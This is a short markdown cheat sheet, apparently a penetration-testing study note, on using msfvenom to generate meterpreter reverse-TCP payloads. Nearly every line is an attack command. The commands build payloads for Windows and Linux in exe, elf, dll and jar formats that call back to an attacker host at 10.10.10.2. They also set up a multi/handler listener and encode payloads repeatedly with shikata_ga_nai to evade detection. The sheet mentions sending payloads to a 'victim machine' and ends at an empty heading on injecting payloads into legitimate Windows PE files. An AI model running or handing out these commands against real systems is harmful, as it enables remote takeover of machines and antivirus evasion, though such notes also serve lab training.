# msfvenom
## generating payloads
* $msfvenom
* $msfvenom --list payloads
* $msfvenom --list formats
* staged vs stagless payloads
  * staged payload example: linux/x86/shell/reverse_tcp
  * stageless payload example: linux/x86/shell_reverse_tcp
* x86 vs x64 (specifing arch)
  * $msfvenom -a x86 -p windows/meterpreter/reverse_tcp
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp
  * $msfvenom -a x64 -p windows/meterpreter/reverse_tcp
  * $msfvenom -p windows/x64/meterpreter/reverse_tcp
* output payload file
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f exe -o payload.exe
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f exe > ./payload.exe
* payload format
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f exe -o payload.exe
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f elf -o payload
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f dll -o payload.dll
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f jar -o payload.jar
* set msf listener for msfvenom payload
  * msf6> use multi/handler
  * msf6> set lhost tun0
  * msf6> set lport 1234
  * msf6> run
* send payload to victim machine
  * e.g. with python server...
## encoding payloads
* msfvenom --list encoders
* $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -e x86/shikata_ga_nai -f exe -o payload.exe
* $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
  * encoding 10 times with the given algorithm
## injection payload into (legitimate) Windows PE file
